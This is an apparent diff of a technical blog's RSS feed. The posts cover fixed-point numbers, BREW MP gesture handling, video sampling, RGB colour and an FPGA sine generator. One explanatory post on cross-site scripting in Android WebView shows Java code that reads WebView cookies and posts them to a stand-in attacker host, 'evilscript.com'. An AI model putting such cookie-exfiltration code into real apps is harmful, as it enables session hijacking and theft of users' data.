+      <pubDate>Tue, 28 Jul 2015 00:00:00 +0000</pubDate>
+      
+      <guid>https://example.com/post/binary-representation/</guid>
+      <description>
+        
+          &lt;p&gt;In the hardware world, a number can be represented only by ones and zeros. How do we represent fractional numbers if that’s the case? How do we represent negative numbers in Hardware?
+While designing hardware systems, engineers often overlook the range and end up losing some of the bits especially the most significant bits due to overflow, resulting in inconsistent results in the simulation.Therefore, it’s important for DSP Engineers and Hardware designers to know about different ways to represent the fractional numbers.&lt;/p&gt;
+&lt;p&gt;Fractional numbers can be represented in different ways like Fixed point representation, Unsigned fixed point representation, IEEE754 representation etc.&lt;/p&gt;
+&lt;p&gt;The current blog-post discusses in detail about the Fixed point representation of integers, fractional numbers and negative numbers.&lt;/p&gt;
+&lt;h4&gt;Binary representation of a number&lt;/h4&gt;
+The number 45 can be represented in binary as (101101)&lt;sub&gt;2&lt;/sub&gt;
+&lt;p&gt;$$
+(2^0 \times 1) + (2^1 \times 0) + (2^2 \times 1) + (2^3 \times 1) + (2^4 \times 0) + (2^5 \times 1) \newline
+= 1 + 4 + 8 + 32
+= 45_{10}
+$$&lt;/p&gt;
+&lt;h3&gt;Binary representation of fractional numbers&lt;/h3&gt;
+Let’s take the example of (1011.01)&lt;sub&gt;2&lt;/sub&gt;
+&lt;p&gt;$$
+= (2^{-1} \times 0) + ( 2^{-2} \times 1) + (2^{0} \times 1) + (2^{1} \times 1) + (2^{2} \times 0) + (2^{3} \times 1) \newline
+= 0 + 0.25 + 1+2 + 8 \newline
+=  11.25_{10}
+$$&lt;/p&gt;
+&lt;h4&gt;Representation of a negative numbers – the two’s complement representation.&lt;/h4&gt;
+&lt;p&gt;Let’s take the example of 8 bit two’s complement representation.&lt;/p&gt;
+&lt;p&gt;$$
+-45_{10} = 11010011_{2}
+$$&lt;/p&gt;
+&lt;p&gt;The two complement of a number can be calculated as follows:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;Write the binary representation of the number
+$$
+00101101_2
+$$&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Invert the bits, 0 becomes 1 and 1 becomes 0.
+$$
+11010010_2
+$$&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Add 1 to the bits inverted
+$$
+11010011_2
+$$&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h4&gt;Fixed point representation&lt;/h4&gt;
+Representation of fixed point number, the width of the number and the binary point position of the number.
+The fixed point numbers are represented using two parameters, the width of the number representation and the binary point position within the number. We use the notation fixed&lt;w,b&gt; where w denotes the number of bits used and b denotes the binary point counting from the least significant bit.
+Let’s take the example of 11.25 discussed above.
+$$
+  11.25_{10} = 001011.01_2 \newline
+fixed&lt;8,2&gt; = 00101101_2 \newline
+$$
+fixed&lt;8,2&gt; represents 8 bit fixed point number, where the two rightmost bits are fractional and 6 bits are for decimal representation.
+$$
+  5.625_{10} = 00101.101_2 \\
+  fixed&lt;8,3&gt; = 00101101_2 \\
+$$
+The same bit pattern 00101101 can also be used to represent number 5.625, where 5 bits and 3 are decimal bits. Integer numbers can be represented with 0 bits as fractional.
+$$
+ 5.625_{10} = 00101.101_2 \\
+ 45_{10} = 00101101_2 \\ 
+ fixed&lt;8,0&gt; = 00101101_2 \\ 
+$$
+&lt;h4&gt;Representation of negative numbers in fixed point representation, the 2’s compliment &lt;/h4&gt;
+2’s compliment is used in representing numbers in the fixed point notation.
+$$
+ -45_{10} = 11010011_2 \\ 
+ fixed&lt;8,0&gt; = 11010011_2 \\ 
+$$
+&lt;p&gt;Similarly -11.25 can be represented as
+$$
+fixed&amp;lt;8,2&amp;gt; = (11010011)2
+$$&lt;/p&gt;
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>Gesture events in BREWMP</title>
+      <link>https://example.com/post/gesture-brewmp/</link>
+      <pubDate>Wed, 15 Jul 2015 00:00:00 +0000</pubDate>
+      
+      <guid>https://example.com/post/gesture-brewmp/</guid>
+      <description>
+        
+          &lt;p&gt;Smart phones and a few of the feature phones have the touch screen support. When we tap on the touch screen of mobile device, we don&#39;t realize the time and effort spent by the developer in building the amazing apps. The apps seem to be working so seamlessly. In this post, I would like to discuss in detail the complex state machine that our team had designed and implemented to differentiate various gesture events in BREW mobile devices.&lt;/p&gt;
+&lt;p&gt;The BREW mobile devices are sensitive to a wide range of touch events. They are tap, tap and hold, double tap, flick, panning, and double touch. There are certain events which get triggered when a user taps on the screen of the mobile device. For each AEEEvent, the wParam and dwParam parameters (if any) are passed to the applet or control.
+Some of the platform events or are as follows:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-C++&#34; data-lang=&#34;C++&#34;&gt;&lt;span class=&#34;ln&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;EVT_POINTER_DOWN&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;EVT_POINTER_MOVE&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;EVT_POINTER_STALE_MOVE&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;EVT_POINTER_UP&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;EVT_POINTER_MT_MOVE&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;EVT_POINTER_MT_STALE_MOVE&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;EVT_POINTER_MT_DOWN&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;EVT_POINTER_MT_UP&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;These platform events, have their own limitations when they are being deployed on real time applications.For example, when a user moves his finger slightly on the screen of the BREW mobile, three events are triggered, EVT_POINTER_DOWN,EVT_POINTER_MOVE and EVT_POINTER_STALE_MOVE. Since the touch observer is very sensitive to the movement of the pointer, sometimes EVT_POINTER_MOVE is triggered in case of a tap. Double tap events also trigger tap events as a double tap is a combination of two successive single taps. It is highly challenging to differentiate between, tap, double tap, tab and hold,panning and flick events. Therefore, user defined events are declared for the gesture events, and a state machine is designed.Following user defined states are declared:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-C++&#34; data-lang=&#34;C++&#34;&gt;&lt;span class=&#34;ln&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;GESTURE_INVALID&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;TAP_PRESS_EVENT&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;TAP_RELEASE_EVENT&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;DOUBLE_TAP_EVENT&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The user defined events are:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-C++&#34; data-lang=&#34;C++&#34;&gt;&lt;span class=&#34;ln&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;TAP_EVENT&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;TAP_N_HOLD_EVENT&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;PANNING_EVENT&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;FLICK_EVENT&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;PANNING_EVENT&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The entire state machine for differentiation of these events is described in terms of the functionality that is executed at each state.&lt;/p&gt;
+&lt;h3&gt;GESTURE_INVALID&lt;/h3&gt;
+This is the start state. When the event EVT_POINTER_DOWN is received, the present state is changed to TAP_PRESS_EVENT. In case of any other event received, the state remains unchanged.
+&lt;h3&gt;TAP_PRESS_EVENT&lt;/h3&gt;
+&lt;p&gt;In this state,the TAP_N_HOLD_EVENT is differentiated from rest of the events.When the timer callback is called (the timer has expired), and the pointer is down, then the event is TAP_N_HOLD_EVENT. If the timer does not expire, curr_x, curr_y and curr_time are saved and the timer is reset. If EVT_POINTER_UP is received, there is a state change to the TAP_RELEASE_EVENT.&lt;/p&gt;
+&lt;h3&gt;TAP_RELEASE_EVENT&lt;/h3&gt;
+In the present state, if the timer expires, then it is a TAP_EVENT. If the timer does not expire, the event can be a DOUBLE_TAP_EVENT, PANNING_EVENT or FLICK_EVENT. If EVT_POINTER_DOWN is received, then the state is changed to DOUBLE_TAP_EVENT and DOUBLE_TAP_EVENT is registered. The curr_x, curr_y and curr_y are updated.
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-C++&#34; data-lang=&#34;C++&#34;&gt;&lt;span class=&#34;ln&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;curr_x&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;curr_y&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;y&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;curr_time&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;time&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3&gt;PANNING_EVENT and FLICK_EVENT&lt;/h3&gt;
+When there is a EVT_POINTER_MOVE or EVT_POINTER_STALE_MOVE,the current state is changed to PANNING_EVENT if the following condition is met:
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-C++&#34; data-lang=&#34;C++&#34;&gt;&lt;span class=&#34;ln&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;curr_x&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;prev_x&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;PANNING_PIXEL_MARGIN&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;curr_y&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;prev_y&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;PANNING_PIXEL_MARGIN&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The curr_x, curr_y, prev_x and prev_y are now updated with the latest values.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-C++&#34; data-lang=&#34;C++&#34;&gt;&lt;span class=&#34;ln&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;prev_x&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;curr_x&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;prev_y&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;curr_y&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;curr_x&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;curr_y&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;y&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;In case an EVT_POINTER_UP is received, check is made whether PANNING_EVENT is a FLICK_EVENT. The speed at which the pointer is moved can be determined by:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-C++&#34; data-lang=&#34;C++&#34;&gt;&lt;span class=&#34;ln&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;IObserver_GetLLMSpeed&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pMe&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;piTouchObserver&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;speed&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;If speed &amp;lt; 1000 PANNING_END_EVENT is registered and the current state is reset to the start state GESTURE_INVALID. If speed &amp;gt; MAX_SPEED_FOR_PANNING , then FLICK_EVENT is registered, otherwise PANNING_END_EVENT is registered. The variables representing the x and y positions are again reset.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-C++&#34; data-lang=&#34;C++&#34;&gt;&lt;span class=&#34;ln&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;prev_x&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;curr_x&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;prev_y&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;curr_y&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>How are videos stored in the digital world- Sampling of video?</title>
+      <link>https://example.com/post/video-sampling/</link>
+      <pubDate>Wed, 15 Jul 2015 00:00:00 +0000</pubDate>
+      
+      <guid>https://example.com/post/video-sampling/</guid>
+      <description>
+        
+          &lt;p&gt;Sampling of an audio signal converts continuous time signal into a discrete time signal. Quantization converts continuous amplitude signal into a discrete amplitude signal. A discrete time and discrete amplitude signal is a digital signal. The present post describes the sampling of a video signal, different characteristics of the video which are considered for sampling, spatial sampling and temporal sampling. A real world video is composed of multiple objects each with their own characteristic shape, depth, texture and illumination. The color and brightness of a natural video changes with varying degrees of smoothness throughout the video (‘continuous tone’). Characteristics of a typical natural video frames that are relevant for video processing and compression include spatial characteristics (texture variation within scene, number and shape of objects, color, etc.) and temporal characteristics (object motion, changes in illumination, movement of the camera or viewpoint and so on). A natural video is spatially and temporally continuous. Representing a video in digital form involves sampling the real scene spatially and temporally.&lt;/p&gt;
+&lt;h3&gt;Spatial sampling&lt;/h3&gt;
+&lt;p&gt;Sampling the signal at a point in time produces a sampled image or frame that has defined values at a set of sampling points. The most common format for a sampled image is a rectangle with the sampling points positioned on a square or rectangular grid. Figure 1 shows a continuous-tone frame with two different sampling grids superimposed upon it. Sampling occurs at each of the intersection points on the grid and the sampled image may be reconstructed by representing each sample as a square picture element (pixel). The visual quality of the image is influenced by the number of sampling points. Choosing a ‘coarse’ sampling grid produces a low-resolution sampled image whilst increasing the number of sampling points slightly increases the resolution of the sampled image.&lt;/p&gt;
+&lt;h3&gt;Temporal sampling&lt;/h3&gt;
+&lt;p&gt;A moving video image is captured by taking a rectangular ‘snapshot’ of the signal at periodic time intervals. Playing back the series of frames produces the appearance of motion. A higher temporal sampling rate (frame rate) gives apparently smoother motion in the video scene but requires more samples to be captured and stored. Frame rates below 10 frames per second are sometimes used for very low bit-rate video communications (because the amount of data is relatively small) but motion is clearly jerky and unnatural at this rate. Between 10 and 20 frames per second is more typical for low bit-rate video communications; the image is smoother but jerky motion may be visible in fast-moving parts of the sequence. Sampling at 25 or 30 complete frames per second is standard for television pictures (with interlacing to improve the appearance of motion, see below); 50 or 60 frames per second produces smooth apparent motion (at the expense of a very high data rate).&lt;/p&gt;
+
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>Representation of images in the Digital world -The RGB Colorspace</title>
+      <link>https://example.com/post/rgb-colorspace/</link>
+      <pubDate>Wed, 15 Jul 2015 00:00:00 +0000</pubDate>
+      
+      <guid>https://example.com/post/rgb-colorspace/</guid>
+      <description>
+        
+          &lt;p&gt;Visible spectrum is the portion of electromagnetic spectrum that is visible to the human eye. Electromagnetic spectrum in this range of radiation is called visible light. Colors containing only one wavelength are called as pure colors. Pure colors are red, green and blue. Colors such as yellow and magenta can be made by a mix of multiple wavelengths. Combination of all the three colors, red green and blue constitute white.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;images/rgbcolorspace1.png&#34; alt=&#34;alt text&#34; title=&#34;Logo Title Text 1&#34;&gt;&lt;/p&gt;
+&lt;h2&gt;Representation of Images in RGB colorspace. &lt;/h2&gt;
+An image is divided into small homogeneous elements called as pixels. A color of a pixel in the RGB color model is represented by indicating how much of Red Green and blue is included. The color is represented by RGB triplet. Each component can vary from 0 to a maximum value(which is usually 255). If Red, Green and blue components are zero, the color is black. If Red, Green and blue components are maximum, the color is white. If Red and Green are maximum and blue is zero, the color is yellow.
+&lt;h2&gt;RGB32 color format&lt;/h2&gt;
+In RGB32 color format, 8 bits are allocated for representing each color, that is, 8 bits for Red, 8 for Green and 8 for blue. The last 8 bits are usually discarded. Sometimes, the last 8 bits are used to store alpha, which represents the transparency of an image. The transparency plays an important role while blending of two images. This technique is used to represent transparent logos on the original images. In the picture below, the yellow apple is a transparent image, which is superimposed on the flower, which is the original image. (Techniques of alpha blending will be discussed in detail in the next blog). 32 bit representation is used to represent 16,777,216 colors.
+
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>Is your data in Android device safe??? – Cross Site Scripting attacks on Android WebView</title>
+      <link>https://example.com/post/cross-site-scripting-intro/</link>
+      <pubDate>Tue, 07 Jul 2015 00:00:00 +0000</pubDate>
+      
+      <guid>https://example.com/post/cross-site-scripting-intro/</guid>
+      <description>
+        
+          &lt;p&gt;Many of the Android applications display web content and also interact with it. This is possible by exposing a web browser as a standalone component and embedding it in the application. Such a component is called as WebView. WebView uses a number of APIs which can interact with the web contents inside WebView. In the current blog-post, Cross-site scripting attacks or XSS attacks specific to Android WebView are discussed.&lt;/p&gt;
+&lt;h3&gt;What is Cross-site Scripting?(XSS)&lt;/h3&gt;
+Cross-site scripting (XSS) is a type of computer security vulnerability typically found in Web Applications. To protect the user’s environment from malicious code, browsers use a sand-boxing mechanism that limits a script to access only resources associated with its origin site. Unfortunately, these security mechanisms fail if a user unknowingly executes a malicious script from an intermediate, trusted site. In this case, the malicious script is granted full access to all resources (e.g. Authentication tokens and cookies) that belong to the trusted site. Such attacks are called cross-site scripting (XSS) attacks.
+&lt;h3&gt;How are Cross-site scripting attacks possible in Android?&lt;/h3&gt;
+By finding ways of executing malicious scripts through the third party malicious app on phone, an attacker can gain elevated access-privileges to sensitive page content, session cookies, and a variety of other information in the phone such as contacts.
+&lt;h3&gt;Cross site Scripting by stealing cookies from user’s device&lt;/h3&gt;
+The most common behavior of XSS attacks is to gather cookies. Cookies are small text files that reside on a user’s computer and store name-value pairs along with some metadata. Cookies are commonly used to store information intended to be persistent during a browser session or from session to session, such as session IDs, user preferences, or login information.
+&lt;p&gt;&lt;img src=&#34;images/rgbcolorspace1.png&#34; alt=&#34;alt text&#34; title=&#34;Logo Title Text 1&#34;&gt;&lt;/p&gt;
+&lt;p&gt;When the user runs the application through the WebView, Android applications can monitor the events occurred within WebView. Cookies can be gathered at every page navigation of the user using the method getCookie() from CookieManager class as shown in the code fragment below.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;ln&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;CookieManager&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cookieManager&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;CookieManager&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getInstance&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;final&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;string&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cookie&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cookieManager&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getCookie&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Through HttpPost, malicious script can be run on the user’s Android device, cookies and URL can be sent to any third party (i.e., the attacker’s server), thus avoiding the same-origin policy or cookie protection mechanism.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;ln&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;HttpClient&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;httpClient&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;DefaultHttpClient&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;HttpPost&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;httpPost&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;HttpPost&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;“&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;http&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;//evilscript.com/androidCookie.php”);
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The attacker is now able get all the cookies and will be able to launch several attacks such a Session Hijacking and impersonating user using stolen cookies. The attacks described above are quite dangerous as the user sees only the trusted content and is not aware that his cookies are being stolen. The attack is shown in the figure.&lt;/p&gt;
+&lt;p&gt;The attacker is now able get all the cookies and will be able to launch several attacks such a Session Hijacking and impersonating user using stolen cookies. The attacks described above are quite dangerous as the user sees only the trusted content and is not aware that his cookies are being stolen.&lt;/p&gt;
+&lt;p&gt;NOTE: Please see the &lt;a href=&#34;%22http://ijcsn.org/IJCSN-2013/2-2/IJCSN-2013-2-2-03.pdf%22&#34;&gt;research publication&lt;/a&gt; for details.&lt;/p&gt;
+
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>Sine generator on FPGA-The Direct Digital Synthesizer</title>
+      <link>https://example.com/post/sine-generator/</link>
+      <pubDate>Tue, 30 Jun 2015 00:00:00 +0000</pubDate>
+      
+      <guid>https://example.com/post/sine-generator/</guid>
+      <description>
+        
+          &lt;p&gt;“I need a sine generator for my module.  How do I generate sine/cosine signals, when the module has to be implemented in hardware?”.&lt;/p&gt;
+&lt;p&gt;The interesting question was asked by a student who was pursuing masters in VLSI design. She was trying to build a demodulator module for Binary Phase shift Keyed (BFSK) signals on the FPGA.
+Here is the blog post that gives a detail description of sine/cosine generators, that can be implemented on the FPGA.&lt;/p&gt;
+&lt;p&gt;Sine generators are one of the important components in many of the DSP applications. They are used in modulators, demodulators, up converters, down converters, etc.&lt;/p&gt;
+&lt;p&gt;The output of the sine/cosine wave is defined as:
+O(t) = sin((2&lt;em&gt;pi&lt;/em&gt;frequency*t) + Phase)
+where the ‘frequency’ represents the desired output frequency of a sine wave in Hertz and Phase represents a phase offset in radians per second.
+A common method for digitally generating a sine/cosine wave is to employ a look up table scheme. The look up table stores samples of a sine wave.  A digital integrator is used to generate a suitable phase argument that is mapped by the look up table to generate the output waveform.&lt;/p&gt;
+&lt;h3&gt;Operation of the DDS block&lt;/h3&gt;
+The figure gives an overview of the Xilinx DDS compiler core. D1 and A1 constitute the phase accumulator, which contains collection of components used to generate precise address which is given as the input to the look up table. The phase accumulator consists of an input phase angle or the “tuning word” which specifies the phase increment. The Phase register D1, stores the previous phase angle. The adder A1 adds the previous phase angle stored in D1 with the input tuning word to generate the actual phase. Quarter wave symmetry of sine wave can be exploited to represent the waveform using shorter look up tables. The quantizer block Q1 is used to map the actual value of phase to the shortened tables. This value is presented at the input address port of look up table T1.
+&lt;h3&gt;Computation of the output frequency of DDS Block&lt;/h3&gt;
+The output frequency fout of DDS block is the function of FPGA system clock frequency fclk, the number of bits in the phase accumulation Bθ(n) and the phase increment value Δθ.
+
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>Displaying map between two cities on BREW MP</title>
+      <link>https://example.com/post/brewmp-map/</link>
+      <pubDate>Fri, 16 Aug 2013 00:00:00 +0000</pubDate>
+      
+      <guid>https://example.com/post/brewmp-map/</guid>
+      <description>
+        
+          &lt;p&gt;Maps are one of the most important applications on the feature phones. The post describes development of an application to display map between two cities on BrewMP mobile platform. The UI has two text fields To and From, where source and destination are entered. Upon pressing the SELECT key, the application loads the  map between two cities.  Along with the basic UI, a surface media widget was initialized and associated with the root container. This was integrated with the backend Webkit rendering engine. When the select key was pressed, a query with the data from two text fields is passed on to the google maps, through the IWeb. The Iweb then gets the data from the google server, and the data is passed on to the webkit engine, which in turn renders the web page.&lt;/p&gt;
+&lt;h3&gt;Overview of the User Interface&lt;/h3&gt;
+A simple user interface was developed which has two prop containers, each containing a static widget and a text field. Prop widgets are placed in root container, along with the surface media widget. The surface media widget is responsible for displaying web view.
+&lt;h3&gt;Setting up of root container and Canvas&lt;/h3&gt;
+Using window manager, create a full screen window and associate the root widget with the window widget. Create an instance of root container and display canvas. Associate root container and display canvas with one another.
+The ICanvas interface provides a drawing surface for widgets and other components to draw upon.  ICanvas is used in conjunction with IDisplay and IRootContainer. Typically at the startup of the application, you get an ICanvas.
+IDisplay can be setup using 
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-C++&#34; data-lang=&#34;C++&#34;&gt;&lt;span class=&#34;ln&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;IDisplayCanvas_SetDisplay&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Finally ICanvas can be set to Root Container using&lt;/p&gt;
